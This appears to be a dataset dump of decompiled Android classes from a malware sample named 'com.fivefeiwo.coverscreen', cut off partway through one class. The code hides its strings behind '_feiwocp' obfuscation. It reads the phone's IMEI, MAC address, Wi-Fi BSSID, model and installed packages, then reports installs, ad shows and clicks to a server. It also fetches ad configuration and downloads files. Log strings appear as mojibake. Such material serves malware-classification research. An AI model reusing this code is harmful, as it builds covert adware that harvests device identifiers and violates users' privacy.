"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ah.code","public final class ah {   private static ah a;   private ah(){     ""PackageInfoManager_feiwocp"".replace(""_feiwocp"","""");   }   public static ah a(){     if (a == null) {       a=new ah();     }     return a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   }   public static boolean a(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ai.code","public final class ai { static {     ""SAVE_IMEI_feiwocp"".replace(""_feiwocp"","""");   }   public static String a(){     try {       return Build.MANUFACTURER;     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     return aq.a(str) ? b(context) : str;   }   public static String b(){     try {       return Build.MODEL;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return null;     }   }   public static ao d(  Context context){     ao aoVar=new ao();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);     aoVar.a=displayMetrics.widthPixels;     aoVar.b=displayMetrics.heightPixels;     return aoVar;   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\aj.code","public final class aj {   private static aj a=null;   private Handler b=new al(this);   private ConcurrentHashMap c=new ConcurrentHashMap();   private ExecutorService d=Executors.newSingleThreadExecutor();   private ConcurrentHashMap e=new ConcurrentHashMap();   public static Bitmap a(  Context context,  String str){     Bitmap bitmap;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i=options.outWidth;     int i2=options.outHeight;     ao d=ai.d(context);     int i3=1;     while (i / 2 > d.a && i2 / 2 > d.b) {       i/=2;       i2/=2;       i3<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i3;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public static aj a(){     if (a == null) {       a=new aj();     }     return a;   }   public static void a(  aj ajVar,  Context context,  String str){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     HttpURLConnection httpURLConnection2;     InputStream inputStream;     FileOutputStream fileOutputStream2;     FileOutputStream fileOutputStream3=null;     fileOutputStream3=null;     HttpURLConnection httpURLConnection3=null;     Y.a();     String a2=Y.a(context,S.d,str);     File file=new File(a2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(a2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(5000);         httpURLConnection2.setReadTimeout(5000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         inputStream=httpURLConnection2.getInputStream();         fileOutputStream2=new FileOutputStream(file);       }  catch (      Exception e) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      Throwable th) {         httpURLConnection=httpURLConnection2;         th=th;       }     }  catch (    Exception e2) {       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       httpURLConnection=null;     }     try {       byte[] bArr=new byte[IController.L1_VALUE];       while (true) {         int read=inputStream.read(bArr);         if (read == -1) {           break;         }  else {           fileOutputStream2.write(bArr,0,read);         }       }       fileOutputStream2.flush();       fileOutputStream2.close();       file.renameTo(file2);       try {         fileOutputStream2.close();         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }       }  catch (      IOException e3) {       }     }  catch (    Exception e4) {       httpURLConnection3=httpURLConnection2;       fileOutputStream=fileOutputStream2;       if (fileOutputStream != null) {         try {           fileOutputStream.close();         }  catch (        IOException e5) {           return;         }       }       if (httpURLConnection3 != null) {         httpURLConnection3.disconnect();       }     } catch (    Throwable th3) {       fileOutputStream3=fileOutputStream2;       httpURLConnection=httpURLConnection2;       th=th3;       if (fileOutputStream3 != null) {         try {           fileOutputStream3.close();         }  catch (        IOException e6) {           throw th;         }       }       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }       throw th;     }   }   public final Drawable a(  Context context,  String str,  am amVar){     boolean z;     if (this.c.containsKey(str)) {       Queue queue=(Queue)this.c.get(str);       if (amVar != null) {         queue.add(amVar);       }       z=true;     }  else {       ConcurrentLinkedQueue concurrentLinkedQueue=new ConcurrentLinkedQueue();       this.c.put(str,concurrentLinkedQueue);       if (amVar != null) {         concurrentLinkedQueue.add(amVar);       }       z=false;     }     if (!z) {       this.d.submit(new ak(this,context,str));     }     return null;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ak.code","public final class ak implements Runnable {   private Context a;   private String b;   private aj c;   public ak(  aj ajVar,  Context context,  String str){     this.c=ajVar;     this.a=context;     this.b=str;   }   @Override public final void run(){     ConcurrentHashMap concurrentHashMap;     Handler handler;     Handler handler2;     Y.a();     String a=Y.a(this.a,S.d,this.b);     concurrentHashMap=this.c.e;     WeakReference weakReference=(WeakReference)concurrentHashMap.get(this.b);     Bitmap bitmap=weakReference != null ? (Bitmap)weakReference.get() : null;     if (bitmap == null) {       try {         aj ajVar=this.c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e) {       }     }     if (bitmap == null) {       try {         aj.a(this.c,this.a,this.b);       }  catch (      Exception e2) {       }     }     if (bitmap == null) {       try {         aj ajVar2=this.c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e3) {       }     }     new StringBuilder().append(""loadDrawable complete, bitmap: "").append(bitmap).append("", url: "").append(this.b);     handler=this.c.b;     handler2=this.c.b;     handler.sendMessage(handler2.obtainMessage(0,new Object[]{this.b,bitmap}));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\al.code","public final class al extends Handler {   private aj a;   public al(  aj ajVar){     this.a=ajVar;   }   @Override public final void handleMessage(  Message message){     ConcurrentHashMap concurrentHashMap;     ConcurrentHashMap concurrentHashMap2;     if (message.obj == null) {       return;     }     Object[] objArr=(Object[])message.obj;     String str=(String)objArr[0];     Bitmap bitmap=(Bitmap)objArr[1];     BitmapDrawable bitmapDrawable=null;     if (bitmap != null) {       concurrentHashMap2=this.a.e;       concurrentHashMap2.put(str,new WeakReference(bitmap));       bitmapDrawable=new BitmapDrawable(bitmap);     }     concurrentHashMap=this.a.c;     Queue queue=(Queue)concurrentHashMap.remove(str);     if (queue != null) {       Iterator it=queue.iterator();       while (it.hasNext()) {         ((am)it.next()).a(bitmapDrawable);       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\am.code","public interface am {   void a(  Drawable drawable); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\an.code","public final class an {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Drawable a(  String str){     Drawable drawable=null;     try {       if (S.f.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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"".getBytes(""UTF-8"")),0),null);       }  else       if (S.g.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(""UTF-8"")),0),null);       }  else       if (S.h.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(""UTF-8"")),0),null);       }     }  catch (    Exception e) {     }     return drawable;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\AnimationAnimationListenerC0035x.code","final class AnimationAnimationListenerC0035x implements Animation.AnimationListener {   private Animation.AnimationListener a;   private View b;   public AnimationAnimationListenerC0035x(  C0030s c0030s,  Animation.AnimationListener animationListener,  View view){     this.a=animationListener;     this.b=view;   }   @Override public final void onAnimationEnd(  Animation animation){     this.a.onAnimationEnd(animation);     this.b.setVisibility(0);   }   @Override public final void onAnimationRepeat(  Animation animation){     this.a.onAnimationRepeat(animation);   }   @Override public final void onAnimationStart(  Animation animation){     this.a.onAnimationStart(animation);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ao.code","public final class ao {   int a=0;   int b=0; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ap.code","public final class ap {   public static int a(  Context context,  String str,  String str2,  int i){     return context.getSharedPreferences(str,0).getInt(str2,i);   }   public static String a(  Context context,  String str,  String str2){     return a(context,str,str2,""0"");   }   public static String a(  Context context,  String str,  String str2,  String str3){     return context.getSharedPreferences(str,0).getString(str2,str3);   }   public static void a(  Context context,  String str,  String str2,  boolean z){     context.getSharedPreferences(str,0).edit().putBoolean(str2,z).commit();   }   public static void b(  Context context,  String str,  String str2){     context.getSharedPreferences(str,0).edit().remove(str2).commit();   }   public static void b(  Context context,  String str,  String str2,  int i){     context.getSharedPreferences(str,0).edit().putInt(str2,i).commit();   }   public static void b(  Context context,  String str,  String str2,  String str3){     context.getSharedPreferences(str,0).edit().putString(str2,str3).commit();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\aq.code","public final class aq {   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || str.equals(""null"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\B.code","public final class B implements Animation.AnimationListener {   final A a;   private LinearLayout b;   public B(  A a,  LinearLayout linearLayout){     this.a=a;     this.b=linearLayout;   }   @Override public final void onAnimationEnd(  Animation animation){     this.b.setOnTouchListener(new C(this));     this.a.setOnClickListener(new D(this));   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C.code","final class C implements View.OnTouchListener {   private B a;   public C(  B b){     this.a=b;   }   @Override public final boolean onTouch(  View view,  MotionEvent motionEvent){     this.a.a.c.onTouchEvent(motionEvent);     return true;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0013b.code","public final class C0013b extends Thread {   private AbstractC0012a a;   public C0013b(  AbstractC0012a abstractC0012a){     this.a=abstractC0012a;   }   @Override public final void run(){     Context e=this.a.e();     String replace=""coverscreen_feiwocp"".replace(""_feiwocp"","""");     try {       if (!e.getSharedPreferences(replace,0).getBoolean(""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),true)) {         AbstractC0012a.b(this.a);       }  else {         try {           Thread.sleep(60000L);         }  catch (        InterruptedException e2) {         }         AbstractC0012a.a(this.a);       }     }  catch (    Exception e3) {     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0014c.code","public final class C0014c extends TimerTask {   private AbstractC0012a a;   public C0014c(  AbstractC0012a abstractC0012a){     this.a=abstractC0012a;   }   @Override public final void run(){     this.a.b();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0015d.code","public final class C0015d implements aa {   private AbstractC0012a a;   public C0015d(  AbstractC0012a abstractC0012a){     this.a=abstractC0012a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆuploadClientInfoï¼‰ï¼š"").append(str);     context=this.a.d;     ap.a(context,""coverscreen_feiwocp"".replace(""_feiwocp"",""""),""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),false);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0016e.code","public final class C0016e implements aa {   private AbstractC0012a a;   public C0016e(  AbstractC0012a abstractC0012a){     this.a=abstractC0012a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstallï¼‰ï¼š"").append(str);     if (z) {       context=this.a.d;       ap.b(context,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0020i.code","final class C0020i implements aa {   private CPManager a;   public C0020i(  CPManager cPManager){     this.a=cPManager;   }   @Override public final void a(  boolean z,  String str){     List b;     List list;     List list2;     List list3;     this.a.e();     new StringBuilder().append(""èŽ·å�–å¹¿å‘Šçš„ç½‘ç»œè¯·æ±‚å¾—åˆ°è¿”å›žç»“æžœï¼š"").append(str);     if (z) {       try {         JSONObject jSONObject=new JSONObject(str);         int optInt=jSONObject.optInt(""errorcode_feiwocp"".replace(""_feiwocp"",""""),1);         String optString=jSONObject.optString(""errormessage_feiwocp"".replace(""_feiwocp"",""""));         if (optInt != 0) {           this.a.e();           new StringBuilder().append(""request failed: "").append(optString);         }  else {           int optInt2=jSONObject.optInt(""screenOnNum_feiwocp"".replace(""_feiwocp"",""""),-1);           int optInt3=jSONObject.optInt(""screenOnShowRate_feiwocp"".replace(""_feiwocp"",""""),-1);           jSONObject.optInt(""coverScreenRefreshTime_feiwocp"".replace(""_feiwocp"",""""),60);           int optInt4=optInt2 == -1 ? jSONObject.optInt(""screenNoNum_feiwocp"".replace(""_feiwocp"",""""),3) : optInt2;           int optInt5=optInt3 == -1 ? jSONObject.optInt(""screenNoShowRate_feiwocp"".replace(""_feiwocp"",""""),10) : optInt3;           int optInt6=jSONObject.optInt(""screenOnSwitchDelay_feiwocp"".replace(""_feiwocp"",""""),10);           boolean optBoolean=jSONObject.optBoolean(""screenOnShow_feiwocp"".replace(""_feiwocp"",""""),true);           boolean optBoolean2=jSONObject.optBoolean(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),false);           JSONArray optJSONArray=jSONObject.optJSONArray(""ads_placeholder"".replace(""_placeholder"",""""));           int i=optInt6 > 0 ? optInt6 : 10;           if (optJSONArray != null) {             this.a.a(optJSONArray);           }           CPManager.a(this.a,0);           CPManager cPManager=this.a;           CPManager cPManager2=this.a;           b=CPManager.b(optJSONArray);           cPManager.c=b;           this.a.d=new Date(new Date().getTime() + 60000);           ap.b(this.a.e(),S.j,S.p,optInt4);           ap.b(this.a.e(),S.j,S.n,optInt5);           ap.b(this.a.e(),S.j,S.o,i * 1000);           ap.a(this.a.e(),S.j,S.l,optBoolean);           ap.a(this.a.e(),S.j,S.i,optBoolean2);           new StringBuilder().append(""setContent, screenOnNum: "").append(optInt4).append("", screenOnShowRate: "").append(optInt5).append("", screenOnSwitchDelay: "").append(i * 1000).append("", enableScreenOnShow: "").append(optBoolean).append("", downloadConfirm: "").append(optBoolean2).append("", coverScreenRefreshTime: "").append(1);         }       }  catch (      JSONException e) {         this.a.e();         new StringBuilder().append(""error result: "").append(e);       }     }     list=this.a.c;     if (list != null) {       list2=this.a.c;       if (!list2.isEmpty()) {         String replace=""C_feiwocp"".replace(""_feiwocp"","""");         StringBuilder append=new StringBuilder().append(""size: _feiwocp"".replace(""_feiwocp"",""""));         list3=this.a.c;         Log.i(replace,append.append(list3.size()).toString());         this.a.c();         this.a.e();         this.a.a(false);       }     }     Log.i(""C_feiwocp"".replace(""_feiwocp"",""""),""size: 0_feiwocp"".replace(""_feiwocp"",""""));     this.a.c();     this.a.e();     this.a.a(false);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0021j.code","final class C0021j extends BroadcastReceiver {   private SA a;   public C0021j(  SA sa){     this.a=sa;   }   @Override public final void onReceive(  Context context,  Intent intent){     this.a.finish();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0024m.code","public final class C0024m extends T {   final SA a;   private Q b;   public C0024m(  SA sa,  Q q){     this.a=sa;     this.b=q;   }   @Override public final void a(  H h,  String str,  boolean z){     super.a(h,str,z);     if (""true_feiwocp"".replace(""_feiwocp"","""").equals(this.b.o()) && z) {       this.a.a.post(new RunnableC0025n(this,str,h));     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0026o.code","public final class C0026o implements aa {   public C0026o(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendClickRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0027p.code","public final class C0027p implements aa {   public C0027p(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendShowRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0028q.code","final class C0028q extends Thread {   private Intent a;   private Context b;   private SR c;   public C0028q(  SR sr,  Intent intent,  Context context){     this.c=sr;     this.a=intent;     this.b=context;   }   @Override public final void run(){     String substring=this.a.getDataString().substring(8);     try {       SR.a(this.c,this.b,substring);       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(substring);       }     }  catch (    Exception e) {       new StringBuilder().append(""ä¸Šä¼ åŒ…å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(e);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0029r.code","public final class C0029r implements aa {   private Context a;   private String b;   public C0029r(  SR sr,  Context context,  String str){     this.a=context;     this.b=str;   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstall from ScreenReceiverï¼‰ï¼š"").append(str);     if (z) {       return;     }     new StringBuilder().append(""ä¸Šä¼ å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(str);     String a=ap.a(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a != null) {       new StringBuilder().append(a).append("","").append(this.b);     }  else {       String str2=this.b;     }     ap.b(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0030s.code","public class C0030s extends LinearLayout {   SA a;   List b;   private Timer c;   private TimerTask d;   private int e;   public C0030s(  SA sa,  List list){     super(sa);     new Handler();     setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setGravity(17);     this.a=sa;     this.b=list;     this.e=ap.a(sa,S.j,S.o,5);   }   private void c(  View view,  Q q){     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setCancelable(false);     builder.setTitle(""æ��ç¤º_feiwocp"".replace(""_feiwocp"",""""));     builder.setMessage(""ç¡®å®šä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" ï¼Ÿ"");     builder.setPositiveButton(""ç¡®å®š_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0032u(this,view,q));     builder.setNegativeButton(""å�–æ¶ˆ_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0033v(this));     builder.show();     i();   }   public int a(  View view,  Q q){     int indexOf=this.b.indexOf(q);     this.b.remove(q);     if (indexOf < 0) {       return 0;     }     if (indexOf >= this.b.size()) {       a(indexOf - 1);       return indexOf - 1;     }     a(indexOf);     return indexOf;   }   public final List a(){     return this.b;   }   public final void a(  int i){     if (this.b.isEmpty()) {       return;     }     